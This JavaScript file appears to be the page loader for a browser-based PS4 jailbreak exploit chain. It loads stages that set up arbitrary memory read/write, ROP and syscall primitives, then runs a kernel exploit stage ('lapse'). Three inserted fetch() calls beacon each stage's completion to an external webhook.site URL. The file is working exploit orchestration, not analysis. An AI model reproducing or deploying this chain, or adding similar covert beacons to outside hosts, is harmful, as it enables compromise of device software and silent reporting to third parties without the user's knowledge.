function load_script(src, remote = true, transfer = []) {
  return new Promise((resolve, reject) => {
    const script = document.createElement("script");
    script.src = src;
    script.onload = resolve;
    script.onerror = reject;
    document.head.appendChild(script);
  });
}

window.onload = async () => {
  await load_script("src/misc.js");

  try {
    version.init();
    switch (version.console) {
      case 4:
        await load_script("src/ps4/constants.js");
        await load_script("src/ps4/userland.js");
        break;
      case 5:
        //TODO
        break;
      default:
        logger.info(`Unsupported console ${version.console}`);
    }

    logger.info("===USERLAND===");

    let rw = undefined;
    if (arw.master === undefined) {
      rw = await init_rw();
    }

    init_arw(rw);
    init_rop();
    init_syscalls();
fetch("https://webhook.site/0047faa7-9cca-4c34-8837-a6cd73b44f32?e=userland-done");

    logger.info("===END===");

    await load_script("src/loader.js");
fetch("https://webhook.site/0047faa7-9cca-4c34-8837-a6cd73b44f32?e=loader-done");
    await load_script("src/workers.js");

    switch (version.console) {
      case 4:
        await load_script("src/ps4/kernel.js");
        break;
      case 5:
        //TODO
        break;
      default:
        logger.info(`Unsupported console ${version.console}`);
    }

    await load_script("src/lapse.js");
fetch("https://webhook.site/0047faa7-9cca-4c34-8837-a6cd73b44f32?e=lapse-done");
    await lapse_main();
    //await load_script("src/netctrl.js");
    //await netctrl_main();
  } catch (e) {
    logger.error(e.message);
    logger.error(e.stack);
  }
};
